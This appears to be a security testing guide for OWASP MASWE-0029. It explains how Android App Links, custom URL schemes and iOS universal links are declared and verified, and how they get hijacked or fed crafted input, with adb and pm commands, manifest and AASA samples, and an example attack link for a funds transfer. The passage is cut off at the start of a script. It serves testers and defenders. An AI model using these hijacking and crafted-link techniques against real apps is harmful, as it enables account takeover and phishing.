---
title: "Insecure Deep Links (MASWE-0029)"
date: 2026-11-09 21:00:00 +0000
subcategory: platform
summary: "Testing Android App Links, custom URL schemes and iOS universal links for hijacking, failed verification and unvalidated input, with adb, simctl and r2."
refs: [MASWE-0029, MASVS-PLATFORM-1, MASVS-STORAGE-2, MASVS-CODE-4, CWE-939, CWE-917]
tags: [android, ios, masvs-platform, deep-links, app-links, universal-links]
---

This note opens our [MASVS-PLATFORM guide](/mobile/masvs-platform-platform-interaction-guide/) and covers OWASP [MASWE-0029](https://mas.owasp.org/MASWE/MASVS-PLATFORM/MASWE-0029/): deep links that either reach the wrong app or make the right app do the wrong thing. A deep link is a URL that any app, web page, email, SMS or QR code can hand to the operating system, and the OS hands it to whichever app claims it. Two things can go wrong. The link can be **claimed by someone else**, because custom URL schemes and unverified web links have no owner, so whatever the link carries (an OAuth code, a magic-login token, a password-reset link) goes to an attacker's app. And the link can be **trusted too much** by the app that receives it, because the OS verifies at most the domain, never the path, query or extras, so a crafted link drives the app into loading attacker pages, changing state or leaking data. Below you will find how Android and iOS register, verify and deliver deep links (intent filters, `autoVerify` and Digital Asset Links with the Android 12 changes, `CFBundleURLTypes`, `sourceApplication` and its iOS 13 limit, the Associated Domains entitlement and the AASA file), how to enumerate and fire every link from the command line or a crafted web page, the five OWASP tests with their demos, our supplementary tests for link hijacking and for the common exploit patterns, secure handler code and how to rate what you find.

## Contents

- [Overview](#overview)
- [Modes of Introduction](#modes-of-introduction)
- [Impact](#impact)
- [Mitigations](#mitigations)
- [Knowledge](#knowledge)
  - [Android: Deep Links (MASTG-KNOW-0019)](#android-deep-links-mastg-know-0019)
  - [iOS: Custom URL Schemes (MASTG-KNOW-0079)](#ios-custom-url-schemes-mastg-know-0079)
  - [iOS: Universal Links (MASTG-KNOW-0080)](#ios-universal-links-mastg-know-0080)
- [Tests](#tests)
  - [Before you start: enumerating and firing every deep link](#before-you-start-enumerating-and-firing-every-deep-link)
  - [MASTG-TEST-0393: Use of Unverified App Links (Android)](#mastg-test-0393-use-of-unverified-app-links-android)
  - [MASTG-TEST-0394: Missing Input Validation in Custom URL Scheme Handlers (Android)](#mastg-test-0394-missing-input-validation-in-custom-url-scheme-handlers-android)
  - [MASTG-TEST-0370: Missing Input Validation in Custom URL Scheme Handlers (iOS)](#mastg-test-0370-missing-input-validation-in-custom-url-scheme-handlers-ios)
  - [MASTG-TEST-0371: Missing Source Validation in Custom URL Scheme Handlers (iOS)](#mastg-test-0371-missing-source-validation-in-custom-url-scheme-handlers-ios)
  - [MASTG-TEST-0395: Missing Input Validation in Universal Link Handlers (iOS)](#mastg-test-0395-missing-input-validation-in-universal-link-handlers-ios)
  - [GT-0029-1: Link hijacking with a competing handler (Android and iOS)](#gt-0029-1-link-hijacking-with-a-competing-handler-android-and-ios)
  - [GT-0029-2: Exploiting unvalidated deep link input (Android and iOS)](#gt-0029-2-exploiting-unvalidated-deep-link-input-android-and-ios)
- [Best practices](#best-practices)
  - [MASTG-BEST-0070: Verify Android App Links with autoVerify and Digital Asset Links](#mastg-best-0070-verify-android-app-links-with-autoverify-and-digital-asset-links)
  - [MASTG-BEST-0071: Validate Input Parameters in Deep Link and Custom URL Scheme Handlers](#mastg-best-0071-validate-input-parameters-in-deep-link-and-custom-url-scheme-handlers)
  - [MASTG-BEST-0054: Validate Input Parameters in Custom URL Scheme Handlers](#mastg-best-0054-validate-input-parameters-in-custom-url-scheme-handlers)
  - [MASTG-BEST-0055: Validate Source Application in Custom URL Scheme Handlers](#mastg-best-0055-validate-source-application-in-custom-url-scheme-handlers)
  - [MASTG-BEST-0072: Validate Input Parameters in Universal Link Handlers](#mastg-best-0072-validate-input-parameters-in-universal-link-handlers)
  - [MASTG-BEST-0045: Limit Sensitive Data Exposure Through iOS IPC Channels](#mastg-best-0045-limit-sensitive-data-exposure-through-ios-ipc-channels)
  - [Secure handler patterns (Guler Tech)](#secure-handler-patterns-guler-tech)
- [Rating findings](#rating-findings)
- [References](#references)

## Overview

MASWE-0029 applies when an app handles deep links insecurely: it relies on a link type that another app can claim, it declares verified links without the domain association that makes them verified, or it acts on the link's contents without validating them. The OWASP requirement is *"The app securely handles deep links."* It maps to MASVS-PLATFORM-1 ("The app uses IPC mechanisms securely"), to MASVS-STORAGE-2 (sensitive data leaking out through the link) and to MASVS-CODE-4 (input validation), to MASVS v1 MSTG-PLATFORM-3, and to two CWEs: [CWE-939](https://cwe.mitre.org/data/definitions/939.html) (Improper Authorization in Handler for Custom URL Scheme) and [CWE-917](https://cwe.mitre.org/data/definitions/917.html) (Expression Language Injection), the latter standing for the wider family of link parameters that reach an interpreter. Android's own risk catalogue lists the problem as [unsafe use of deep links](https://developer.android.com/privacy-and-security/risks/unsafe-use-of-deeplinks). The weakness is tagged for profiles L1, L2 and EUDIW: a baseline expectation for every app.

OWASP describes the threat as MAS-THREAT-0029, *"Attackers can hijack deep links or inject malicious input into the app"*, reached through two attacks: MAS-ATTACK-0046, *registering the same custom URL scheme to intercept links intended for the app*, and MAS-ATTACK-0047, *delivering crafted deep links or intents from a malicious app or web page*. Those two attacks are the two halves of this note, and it helps to keep them apart, because verification fixes one and does nothing for the other:

| Question | Attack | What protects you | Where we test it |
|---|---|---|---|
| Who **receives** the link? | Hijacking (MAS-ATTACK-0046) | Verified links: Android App Links, iOS universal links | MASTG-TEST-0393, GT-0029-1 |
| Who can **send** the link? | Injection (MAS-ATTACK-0047) | Nothing at OS level: everyone can | — (assume "anyone") |
| What does the handler **do** with it? | Injection (MAS-ATTACK-0047) | Validation, allowlists, confirmation in the app | MASTG-TEST-0394, 0370, 0395, GT-0029-2 |
| Can the handler tell **who sent it**? | Both | Only iOS `sourceApplication`, only for your own team's apps | MASTG-TEST-0371 |

The second row is the one teams forget. A verified App Link or universal link guarantees that a tap on `https://example.com/app/…` opens *your* app; it does not stop anyone from writing `https://example.com/app/transfer?to=attacker&amount=9999` into a phishing email, and on Android any installed app can deliver that same URI, or any other, straight to your exported activity with an explicit intent.

Related notes, so you know where the edges are:

- A deep link that performs a privileged action **without authentication** (no session check, no PIN, no confirmation) is the authorisation problem in [MASWE-0018](/mobile/maswe-0018-missing-auth-on-app-components/), including its iOS test GT-0018-7. Here we focus on how the link is claimed and how its input is handled; we point there for the authentication part.
- Exported activities, their permissions and the Android component model are covered in MASWE-0018 too. Intent extras, `Intent.parseUri()`, intent redirection and `PendingIntent`s are [MASWE-0032](/mobile/maswe-0032-insecure-intents/).
- A deep link parameter that ends up in `WebView.loadUrl()` or `WKWebView.load()` is where this weakness hands over to [MASWE-0035](/mobile/maswe-0035-webviews-loading-untrusted-content/) (untrusted content), [MASWE-0033](/mobile/maswe-0033-sensitive-native-functionality-exposed-in-webviews/) (JavaScript bridges) and [MASWE-0034](/mobile/maswe-0034-webviews-allow-access-to-local-resources/) (local files).
- OAuth redirect URIs are deep links. The OAuth side (PKCE, system browser, redirect URI choice) lives in our [MASVS-AUTH guide](/mobile/masvs-auth-authentication-guide/); here we only test whether the redirect can be intercepted.

## Modes of Introduction

**Custom URL schemes used for sensitive flows.** `myapp://` has no owner on either platform. Any app can declare it, and the OS then shows a chooser (Android) or picks one of the claimants without a defined order (iOS). Schemes are fine for "open the app on the settings screen"; they are not fine for carrying an OAuth authorisation code without PKCE, a magic-login token, a password-reset token, an email-verification code, a payment callback the app believes, or anything the user would not want a stranger to read.

**Web links declared but never verified.** On Android: an `http`/`https` `<intent-filter>` without `android:autoVerify="true"`, or with it but with an `assetlinks.json` that is missing, redirected, served with the wrong content type, lists only the upload key instead of the Play App Signing key, or exists on `example.com` but not on `www.example.com`. On iOS: an `applinks:` entitlement whose AASA file is missing, redirected, blocked by a WAF or geo-filter that Apple's CDN hits, or lists the wrong Team ID. The links then fall back to the browser (which breaks the feature) or, on older Android, to a chooser that any other app can join.

**Trusting the link's content because the domain is verified.** Verification proves which app opens the link, not who wrote it. Handlers that take `url`, `redirect`, `next`, `page`, `file`, `path`, `api`, `env`, `callback`, `amount` or `to` from the link and use them without allowlists are the bulk of real findings: WebViews that load attacker pages, external-open calls that make the app a phishing redirector, routers that open internal screens they should not, and "debug" links that switch the backend URL in production.

**State changes on arrival.** A link that follows an account, adds a payee, links a device, accepts an invitation, changes a setting or submits a payment as soon as it is opened is the mobile equivalent of a CSRF-able GET request. The user tapped *something*, but not a confirmation of that action.

**Routing frameworks that expose more than intended.** Jetpack Navigation's `<deepLink>` elements and `<nav-graph>` manifest entry, React Navigation's linking configuration, Flutter's `go_router` and similar libraries generate intent filters or URL routes from a declarative map. Developers add a route for one marketing campaign and forget that every destination with a `deepLink` is now reachable from the outside, with arguments filled from the URL.

**Secrets placed in links by the app itself.** The app (or its backend) generates links that carry long-lived tokens, personal data or session identifiers and sends them out through a scheme or a web link. Even with verification, links are logged by browsers, proxies, analytics SDKs and messaging apps, and synced through browser history.

**Third-party SDKs.** Attribution, marketing and authentication SDKs register their own schemes and hosts and handle them in code you did not write; they appear in the merged manifest and in `Info.plist` like the app's own, and they get the same scrutiny.

## Impact

- **Compromise of sensitive data.** A hijacking app receives whatever the link carries: tokens, codes, personal data in query strings. A handler that obeys a crafted link can send data to an attacker-chosen host (a callback URL, a switched API base URL, a WebView that attaches auth headers).
- **Authentication or authorisation bypass.** Intercepted login, reset or OAuth links give the attacker the account. Crafted links that trigger actions skip the screens where the app would have asked for confirmation or step-up authentication.
- **Execution of attacker-controlled behaviour.** Parameters that reach a WebView, a JavaScript bridge, `evaluateJavascript`, a SQL query, a file path, an intent parser or an expression engine give the attacker code execution inside the app's context or access to its private data.
- **Phishing inside a trusted UI.** An attacker page loaded inside the app's WebView, under the app's chrome and with no address bar, is far more convincing than the same page in a browser.

## Mitigations

- **Use verified links for anything sensitive**: Android App Links with `autoVerify` and a correct Digital Asset Links file on every host, iOS universal links with a correct AASA file. Keep custom schemes for non-sensitive navigation, or for OAuth only together with PKCE.
- **Treat every link as untrusted input**, whether it is a scheme, an unverified link or a verified one: parse it with the platform URL parser, allowlist the paths or hosts you handle, convert and bound every parameter, and reject anything else.
- **Navigate, do not act.** A link opens a screen, pre-fills it at most, and the action happens only after the user confirms it in-app with the session and, where needed, step-up authentication. The server enforces the same rules.
- **Never load a link-supplied URL in a WebView or hand it to an external-open call** without an exact host allowlist; never turn link strings into intents.
- **Validate the source where the platform lets you**: on iOS, check `sourceApplication` for schemes meant only for your own app suite. Android has no reliable equivalent.
- **Keep secrets out of links.** Use single-use, short-lived references that the app redeems over an authenticated channel; bind them to the session or device that requested them.
- **Restrict the handler surface**: no `android:exported="true"` on activities that do not need to be reached from outside, one dedicated router activity or scene method that validates and dispatches, and nothing exported just because a library template did it.

## Knowledge

OWASP links three Knowledge pages to MASWE-0029: one for Android and two for iOS. Each is covered below in our own words and extended with the details you need during a test: the file formats, the per-version behaviour, and the parts of the handler code where findings live.

### Android: Deep Links (MASTG-KNOW-0019)

Source: [MASTG-KNOW-0019](https://mas.owasp.org/MASTG/knowledge/android/MASVS-PLATFORM/MASTG-KNOW-0019/). Vendor documentation: [Create deep links to app content](https://developer.android.com/training/app-links/deep-linking), [Verify Android App Links](https://developer.android.com/training/app-links/verify-android-applinks), [Intents and intent filters](https://developer.android.com/guide/components/intents-filters).

#### Three kinds of link

Android has one mechanism, the `<intent-filter>` on an `<activity>`, and three outcomes depending on what the filter declares and whether the system verified it:

| Kind | Example | Who can claim it | What the OS does on a tap |
|---|---|---|---|
| Custom scheme deep link | `myapp://transfer?amount=10` | Any app | Opens the only handler, or a chooser if several apps match |
| Web link (unverified) | `https://example.com/app/x` without `autoVerify`, or verification failed | Any app | Android 12+: opens the default browser unless the user approved the app for the domain; Android 11 and lower: chooser between the browser and every matching app |
| Android App Link (verified) | `https://example.com/app/x`, `autoVerify="true"`, host verified | Only the app listed in the domain's `assetlinks.json` | Opens the verified app directly, no chooser |

The disambiguation dialog ("Open with…") is the attack surface for MAS-ATTACK-0046: an attacker's app that declares the same scheme or host appears in it, often with a convincing name and the real app's icon, and the user's choice (including "Always") is remembered. A large-scale study of the problem is [Measuring the Insecurity of Mobile Deep Links of Android](https://people.cs.vt.edu/gangwang/deep17.pdf) (Liu et al., USENIX Security 2017).

#### Declaring deep links

A browsable deep link is an `<intent-filter>` with the `VIEW` action, the `DEFAULT` and `BROWSABLE` categories, and `<data>` elements:

```xml
<activity android:name=".DeepLinkActivity" android:exported="true">
    <intent-filter android:autoVerify="true">
        <action android:name="android.intent.action.VIEW" />
        <category android:name="android.intent.category.DEFAULT" />
        <category android:name="android.intent.category.BROWSABLE" />
        <data android:scheme="https" />
        <data android:host="example.com" />
        <data android:pathPrefix="/app/" />
    </intent-filter>
</activity>
```

What each part means for a tester:

- **`BROWSABLE`** is what lets a browser (and any web page through it) launch the activity. Without it, only apps can reach the filter, which is still "any installed app". `DEFAULT` is needed for implicit intents to match at all.
- **`android:exported`** must be `true` for other apps and the browser to reach the activity. Since Android 12 (for apps targeting API 31+), every component with an intent filter must declare `exported` explicitly or the app will not install, so you will always see the value in modern manifests.
- **`<data>` elements in one filter are merged.** Every scheme combines with every host and every path in the same filter, so `<data android:scheme="https" android:host="www.example.com"/>` next to `<data android:scheme="app" android:host="open.my.app"/>` also accepts `app://www.example.com` and `https://open.my.app`. This is how apps end up with handlers they did not mean to have, and how a custom scheme sneaks into a filter that was meant to be a verified App Link.
- **Missing attributes are wildcards.** A scheme with no host matches every host; a host with no path attribute matches every path. Path attributes are `path` (exact), `pathPrefix`, `pathPattern` (simple wildcard syntax), and since API 31 `pathSuffix` and `pathAdvancedPattern`. Query strings and fragments are never matched by the filter, so the handler sees whatever query an attacker appends.
- **Activity aliases** (`<activity-alias>`) can carry intent filters and point at a target activity; include them in your inventory.
- **Jetpack Navigation**: a `<nav-graph android:value="@navigation/…"/>` entry under the activity in the source manifest is expanded at build time into ordinary intent filters for every `<deepLink app:uri="…"/>` in the graph. In the APK you see the expanded filters; in source you have to read the navigation XML. Destination arguments named in the URI pattern (`app:uri="example.com/user/{id}"`) are filled from the incoming URL.

#### App Link verification and the Digital Asset Links file

Setting `android:autoVerify="true"` on a filter asks the system to verify, at install time (and on Android 15+ also periodically in the background), that the website agrees to the association. The system looks at filters with `VIEW`, `BROWSABLE` + `DEFAULT` and `http`/`https`, and for each unique host fetches:

```text
https://<host>/.well-known/assetlinks.json
```

The file is a JSON array of statements. For App Links it must contain a `handle_all_urls` statement naming the package and the SHA-256 fingerprint of the certificate the installed APK is signed with:

```json
[
  {
    "relation": ["delegate_permission/common.handle_all_urls"],
    "target": {
      "namespace": "android_app",
      "package_name": "com.example.app",
      "sha256_cert_fingerprints": [
        "AB:CD:EF:01:23:45:67:89:AB:CD:EF:01:23:45:67:89:AB:CD:EF:01:23:45:67:89:AB:CD:EF:01:23:45:67:89"
      ]
    }
  }
]
```

(The fingerprint above is a placeholder.) Requirements that commonly fail, from the Android documentation's [troubleshooting list](https://developer.android.com/training/app-links/verify-android-applinks#fix-errors) and our own experience:

- **HTTPS, no redirects.** `http` → `https` or `example.com` → `www.example.com` redirects make verification fail for that host. Served as `application/json`, publicly reachable, not behind authentication, a bot challenge or a geo-block.
- **Every host needs its own file.** A filter declaring `example.com` and `www.example.com` needs the file on both. A wildcard host `*.example.com` is checked against the file on `example.com`.
- **The right fingerprint.** With Play App Signing, Google re-signs the app with the *app signing key*; the fingerprint in the file must be that key's (shown in Play Console), not the developer's upload key. Compare against the APK actually installed on the device.
- **Several apps or flavours** can be listed in one file; the domain owner decides which packages may open its links.

How the OS treats the result changed over time:

| Android version | Behaviour |
|---|---|
| 6.0 to 11 (API 23 to 30) | Verification runs at install. The app becomes the default handler only if *all* hosts in its App Link filters verify; one failing host (a missing file on one subdomain) loses them all. Unverified web links show the chooser. |
| 12+ (API 31+), all apps | A generic web intent (`VIEW` + `BROWSABLE` + `http`/`https`) resolves to an app only if that app is **approved for the specific domain**: verified through App Links, or selected by the user under *Settings › Apps › (app) › Open by default › Add link*. Otherwise it goes to the default browser. Custom schemes are not affected. |
| 12+ for apps targeting API 31+ (or with the compat change `175408749` enabled) | The updated verification process: hosts are verified and recorded individually, filters must include `BROWSABLE` and `https`. State is visible with `pm get-app-links`. |
| 15+ (API 35) | The system re-verifies domains periodically in the background; changes to `assetlinks.json` can take up to seven days to reach devices. Before 15, changes are picked up on install or update. |

Only one app can hold a domain on a device at a time. If a verified app owns `example.com`, the user cannot hand that domain to a second app without first disassociating the first, which is what makes verification an effective defence against hijacking on Android 12+.

The commands you will use (Android 12+; they work regardless of the app's target):

```bash
adb shell pm get-app-links com.example.app              # per-domain verification state
adb shell pm get-app-links --user cur com.example.app   # plus the user's selections
adb shell pm set-app-links --package com.example.app 0 all   # reset state
adb shell pm verify-app-links --re-verify com.example.app    # run verification again
adb shell am compat enable 175408749 com.example.app    # new verification for apps targeting < 31
```

Possible states include `verified` (passed), `approved` / `denied` (forced by shell), `migrated`, `restored`, `legacy_failure` (rejected by the legacy verifier), `system_configured`, `none` (not finished yet) and numeric codes of 1024 or more (verifier-specific errors). Anything other than `verified` (or a deliberate `approved` on a test device) means the links are not App Links on that device.

#### Who can send a deep link, and what the handler can know about them

Everyone, and nothing. The ways a deep link reaches an exported `BROWSABLE` activity:

- **Another installed app**, with an implicit intent (subject to the chooser or App Link resolution) or with an explicit intent naming your package and activity, which bypasses all link resolution: verification decides who receives *implicit* web intents, but an explicit intent to an exported activity is delivered no matter what. Android 10+ limits starting activities from the background, so in practice the malicious app has to be in the foreground or hold an exemption, which usually means the user opened it.
- **A web page in a browser**, through a plain `<a href="myapp://…">` or `https://` link, a redirect, or Chrome's [`intent:` URI syntax](https://developer.chrome.com/docs/android/intents), which lets the page name the scheme, action, category and target package and attach **extras** (`S.key=value` for strings; Android's intent-URI format also defines typed prefixes such as `B.` for booleans and `i.` for integers). Chrome only launches activities that declare `BROWSABLE` and only on a user gesture (not from a timer or a redirect of a typed URL), and it strips its own `S.browser_fallback_url`, but other extras reach the app. An activity that reads `getStringExtra()` as well as `getData()` is therefore reachable from the web with both. Some browsers also ask the user to confirm leaving the browser.
- **Messages, email, QR codes, NFC tags and notifications** from other apps, which all end up as one of the above.

The handler cannot reliably tell these apart. `Activity.getReferrer()` returns a value the sender can set (`Intent.EXTRA_REFERRER`); `getCallingPackage()` is only populated when the activity was started for a result; Android 14 added `getLaunchedFromPackage()`/`getLaunchedFromUid()`, but they only return the sender's identity if the sender opted in to share it, which an attacker will not do. OWASP's statement holds: plan as if every deep link handler is reachable by any app and any web page.

#### Handling the incoming link

The activity gets the URI from the launching intent: `intent.data` (`getIntent().getData()`) in `onCreate()`, and again in `onNewIntent()` when the activity is already running (with `launchMode="singleTop"`, `singleTask` or `FLAG_ACTIVITY_SINGLE_TOP`). Both paths need the same validation, and missing the `onNewIntent()` path is a common gap. Values are read with [`Uri`](https://developer.android.com/reference/android/net/Uri) methods:

| Method | Returns | Note |
|---|---|---|
| `getScheme()`, `getHost()`, `getPort()` | URL parts | `getHost()` is not lower-cased; compare case-insensitively |
| `getPath()`, `getPathSegments()`, `getLastPathSegment()` | Decoded path | Decoded `%2F` and `..` reach your code |
| `getQueryParameter(name)` | First value, decoded | Duplicate parameters: only the first is returned |
| `getQueryParameters(name)` | All values | — |
| `getFragment()` | Decoded fragment | Never matched by the intent filter |
| `getUserInfo()` | `user:pass@` part | Should be `null` for any URL you accept |

The `Uri` returned for a deep link comes from `Uri.parse()`, which is lenient by design: it does not validate the string, and its notion of host can differ from the WebView's or OkHttp's for malformed input (backslashes, `@`, odd percent-encoding). Do not build security checks on substring matching of `toString()`; parse, then compare components exactly.

### iOS: Custom URL Schemes (MASTG-KNOW-0079)

Source: [MASTG-KNOW-0079](https://mas.owasp.org/MASTG/knowledge/ios/MASVS-PLATFORM/MASTG-KNOW-0079/). Vendor documentation: [Defining a custom URL scheme for your app](https://developer.apple.com/documentation/xcode/defining-a-custom-url-scheme-for-your-app), [`application(_:open:options:)`](https://developer.apple.com/documentation/uikit/uiapplicationdelegate/1623112-application), [`UIApplication.OpenURLOptionsKey.sourceApplication`](https://developer.apple.com/documentation/uikit/uiapplication/openurloptionskey/sourceapplication).

#### Registration

Schemes are declared in `Info.plist` under `CFBundleURLTypes` (Xcode shows them under *Target › Info › URL Types*):

```xml
<key>CFBundleURLTypes</key>
<array>
    <dict>
        <key>CFBundleURLName</key>
        <string>com.example.myapp</string>
        <key>CFBundleURLSchemes</key>
        <array>
            <string>myapp</string>
            <string>com.googleusercontent.apps.example</string>
        </array>
    </dict>
</array>
```

`CFBundleURLName` is an optional label; `CFBundleURLSchemes` is what counts. Expect more than one scheme in real apps: SDKs for social login, payments and attribution each bring their own (for example a reversed client ID for Google Sign-In, `fb<appid>` for Facebook Login). Each is an entry point and each gets reviewed.

**Collisions.** Apple's documentation is explicit that when several apps register the same scheme, there is no defined process for deciding which one receives the URL. Apple reserves its own schemes (`http`, `https`, `mailto`, `tel`, `sms`, `facetime` and others), so those cannot be taken over, but any custom scheme can be registered by any App Store app. Treat a custom scheme as a public mailbox whose contents might be delivered to a stranger.

**Querying other apps.** For apps linked on or after iOS 9, `canOpenURL(_:)` returns `false` for any scheme not listed in the *calling* app's `LSApplicationQueriesSchemes`; Apple caps that list at 50 entries for apps linked on or after iOS 15, and at 25 for apps linked on or after iOS 27. `open(_:options:completionHandler:)` is not restricted. This matters for fingerprinting (which other apps are installed) more than for this weakness.

#### Handling incoming URLs

Where the URL arrives depends on the app's life-cycle model, and every entry point needs the same validation:

| App model | Cold launch | App already running |
|---|---|---|
| App delegate only (no scenes) | `application(_:didFinishLaunchingWithOptions:)` with `launchOptions[.url]`, then `application(_:open:options:)` | `application(_:open:options:)` |
| UIKit scenes | `scene(_:willConnectTo:options:)` via `connectionOptions.urlContexts` | `scene(_:openURLContexts:)` |
| SwiftUI | `.onOpenURL { url in … }` | `.onOpenURL` |

The deprecated `application(_:handleOpenURL:)` and `application(_:openURL:sourceApplication:annotation:)` (both deprecated in iOS 9) still show up in old code and SDKs; they are still called if they are the only ones implemented.

**The caller's identity.** `application(_:open:options:)` receives `options[.sourceApplication]`, and the scene API exposes `UIOpenURLContext.options.sourceApplication` (`UIScene.OpenURLOptions`) and `UIScene.ConnectionOptions.sourceApplication`. Since iOS 13 Apple's documentation states the rule precisely: *if the request originated from another app belonging to your team, UIKit sets the value to the ID of that app; if the team identifier of the originating app is different, the value is `nil`.* So `sourceApplication` can answer "was this opened by one of our own apps?", and nothing else: a third-party app, Safari, Notes and Messages all look the same (`nil`). SwiftUI's `.onOpenURL` gives you the URL only, without the options.

**User interaction.** When a web page in Safari navigates to a custom scheme, Safari asks the user whether to open the app. Do not count that prompt as a control: it does not appear for every source (a link opened from Notes, Messages or another app's `open(_:)` call is not a Safari navigation), and users who expect the app to open will confirm it.

#### URL structure

The handler receives a `URL` and typically splits it with [`URLComponents`](https://developer.apple.com/documentation/foundation/urlcomponents): `scheme://host/path?name=value#fragment`. Custom-scheme apps often use the *host* as the action name (`myapp://transfer?…`) and the query items as arguments. `URLQueryItem.value` is an optional, already percent-decoded `String`; `queryItems` can contain the same name twice, and `first(where:)` picks the first.

### iOS: Universal Links (MASTG-KNOW-0080)

Source: [MASTG-KNOW-0080](https://mas.owasp.org/MASTG/knowledge/ios/MASVS-PLATFORM/MASTG-KNOW-0080/). Vendor documentation: [Allowing apps and websites to link to your content](https://developer.apple.com/documentation/xcode/allowing-apps-and-websites-to-link-to-your-content), [Supporting associated domains](https://developer.apple.com/documentation/xcode/supporting-associated-domains), [Supporting universal links in your app](https://developer.apple.com/documentation/xcode/supporting-universal-links-in-your-app), [TN3155: Debugging universal links](https://developer.apple.com/documentation/technotes/tn3155-debugging-universal-links).

Universal links are ordinary `https` URLs on a domain that has agreed to be opened by the app. They are Apple's answer to scheme hijacking: an app can only receive universal links for a domain whose owner lists the app in a file on that domain. If the app is not installed, the same URL opens the website.

#### The entitlement

The app declares `com.apple.developer.associated-domains` with one `applinks:` entry per domain (Xcode: *Signing & Capabilities › Associated Domains*):

```xml
<key>com.apple.developer.associated-domains</key>
<array>
    <string>applinks:example.com</string>
    <string>applinks:*.example.com</string>
    <string>applinks:staging.example.com?mode=developer</string>
</array>
```

The entitlement is in the code signature of the main binary, not in `Info.plist`; extract it with `codesign`, `ldid` or `rabin2` (see [Before you start](#before-you-start-enumerating-and-firing-every-deep-link)). Wildcards cover subdomains. Domains cannot carry a port. The `?mode=developer` suffix makes a development-signed build fetch the file directly from the domain instead of Apple's CDN (useful for internal staging hosts) and only works when *Associated Domains Development* is enabled in the device's Developer settings; `?mode=managed` exists for MDM-managed apps. A `mode=developer` entry for a staging host in a production build is worth a note: it tells you about internal infrastructure.

#### The apple-app-site-association file

For each `applinks:` domain, the file must be served at:

```text
https://<domain>/.well-known/apple-app-site-association
```

over HTTPS, with no redirects, as `application/json` (no `.json` extension), publicly reachable from any IP address and user agent. Since iOS 14 the device does not contact the domain itself: Apple's CDN fetches and caches the file (`https://app-site-association.cdn-apple.com/a/v1/<domain>`), devices download it from the CDN at install and check for updates about once a week. So a file that only your office network can reach, or that a WAF blocks for Apple's crawler, silently breaks universal links in production.

The current format (iOS 13+) uses `appIDs` and `components`:

```json
{
  "applinks": {
    "details": [
      {
        "appIDs": ["ABCDE12345.com.example.app"],
        "components": [
          { "/": "/app/*", "comment": "everything under /app/" },
          { "/": "/app/admin/*", "exclude": true },
          { "/": "/reset", "?": { "token": "?*" } }
        ]
      }
    ]
  }
}
```

`appIDs` holds `<Team ID>.<bundle ID>` values and is what binds the domain to the app. Each component can match the path (`/`), query (`?`, a dictionary of parameter patterns) and fragment (`#`), with `*` and `?` wildcards; `exclude: true` removes matches; `caseSensitive` and `percentEncoded` adjust matching. Components are evaluated in order and the first match wins. The legacy format (`appID` string and `paths` array with `NOT` prefixes) still works; Apple advises against mixing both.

From a security point of view, two properties matter. First, the components are **routing filters, not access control**: a path you exclude still opens the website, and a path you include can be called with any query. Second, the file is under the **web team's** control, not the app team's; testing it means looking at the live domain.

#### When a universal link opens the app, and when it does not

From TN3155 and Apple's guides:

- A link **tapped** in Safari, Messages, Mail, Notes or another app opens the app if the domain is verified on the device.
- A URL **typed** into Safari's address bar never opens the app.
- A link to the **same domain** the user is already browsing in Safari stays in Safari; apps that want to open from their own site use a different subdomain.
- The user's choice is remembered per domain: long-pressing a link and picking *Open in Safari* makes later links open in Safari until the user picks the app again.
- Third-party browsers decide for themselves whether to support universal links.
- When the app opens a universal link to its *own* associated domain with `open(_:)`, iOS opens it in Safari, not in the app.

For testing on a device: enable Developer Mode, then *Settings › Developer › Universal Links*: turn on *Associated Domains Development* and use *Diagnostics*, which tells you whether a given URL is a valid universal link for an installed app.

#### Handling incoming universal links

A universal link arrives as an [`NSUserActivity`](https://developer.apple.com/documentation/foundation/nsuseractivity) whose `activityType` is `NSUserActivityTypeBrowsingWeb` and whose `webpageURL` holds the full `https` URL:

| App model | Entry point |
|---|---|
| App delegate | `application(_:continue:restorationHandler:)` |
| UIKit scenes | `scene(_:continue:)`, and `connectionOptions.userActivities` in `scene(_:willConnectTo:options:)` for cold launches |
| SwiftUI | `.onContinueUserActivity(NSUserActivityTypeBrowsingWeb) { activity in … }` |

Universal links never go through `application(_:open:options:)` or `.onOpenURL`, and there is **no `sourceApplication`**: the request comes from "a web context", so the handler knows nothing about the sender. The same continuation entry point also receives Handoff, Spotlight and Siri activities, distinguished by `activityType`; a handler that skips the `activityType` check and reads `userInfo` or `webpageURL` regardless widens its input surface.

The OS verified the **domain**. The path, query and fragment were written by whoever created the link. Apple's own guide says to validate all parameters, discard malformed URLs and limit what a link can trigger.

## Tests

OWASP links five tests to MASWE-0029, two Android and three iOS, all static (with a manual review step); each demo adds a runtime confirmation. All five are filed by OWASP under MASWE-0029 and documented here. They replace these legacy (MASTG v1) tests:

| Legacy test | Replaced by |
|---|---|
| [MASTG-TEST-0028](https://mas.owasp.org/MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0028/) Testing Deep Links (Android) | MASTG-TEST-0393, 0394 |
| [MASTG-TEST-0075](https://mas.owasp.org/MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0075/) Testing Custom URL Schemes (iOS) | MASTG-TEST-0370, 0371 |
| [MASTG-TEST-0070](https://mas.owasp.org/MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0070/) Testing Universal Links (iOS) | MASTG-TEST-0370, 0371, 0395 |

The legacy tests also covered hijacking by a second app and the exploitation of what a handler does with its input; the new tests stop at "is the link verified" and "is the input validated". We keep both parts as [GT-0029-1](#gt-0029-1-link-hijacking-with-a-competing-handler-android-and-ios) and [GT-0029-2](#gt-0029-2-exploiting-unvalidated-deep-link-input-android-and-ios), because they are what turns a static hit into a rated finding. The iOS legacy test for WebView protocol handlers (MASTG-TEST-0077) is not part of this weakness; it lives with [MASWE-0034](/mobile/maswe-0034-webviews-allow-access-to-local-resources/).

### Before you start: enumerating and firing every deep link

One inventory pass feeds all the tests below. Do it once per app and keep the output.

**Android: pull, decode and list.**

```bash
# All splits of the installed app (base + config splits)
adb shell pm path com.example.app
adb pull /data/app/~~XXXX/com.example.app-YYYY/base.apk

apktool d base.apk -o apk_out          # decoded manifest and resources
jadx -d jadx_out base.apk              # Java/Kotlin sources for handler review

grep -n -E 'autoVerify|android.intent.action.VIEW|BROWSABLE|<data ' apk_out/AndroidManifest.xml
```

The decoded `AndroidManifest.xml` is the merged manifest: SDK filters and Jetpack Navigation `<deepLink>` entries are already expanded. Because `<data>` elements in a filter combine, reading the XML by eye misses URLs. This script prints every combination per filter, with the details that matter:

```python
# deeplinks.py — list every deep link an APK declares (apktool-decoded manifest)
import sys, itertools, xml.etree.ElementTree as ET
